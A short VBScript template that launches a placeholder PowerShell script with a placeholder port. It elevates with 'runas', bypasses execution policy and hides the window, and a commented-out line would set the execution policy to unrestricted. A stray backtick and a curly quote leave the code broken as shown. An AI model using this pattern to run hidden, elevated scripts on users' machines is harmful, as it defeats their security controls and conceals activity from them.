Set objShell = CreateObject("Wscript.Shell")
strPath = Wscript.ScriptFullName
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set oShell = CreateObject("Shell.Application")
Set objFile = objFSO.GetFile(strPath)
strFolder = objFSO.GetParentFolderName(objFile)

' Set execution policy
'objShell.Run "PowerShell -NoProfile -ExecutionPolicy Bypass -Command ""& {Start-Process PowerShell -ArgumentList 'Set-ExecutionPolicy unrestricted -Force' -Verb RunAs}""",0,true
`
oShell.ShellExecute "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command “& 'SCRIPTHERE' '-port PORTHERE'", "", "runas", 1
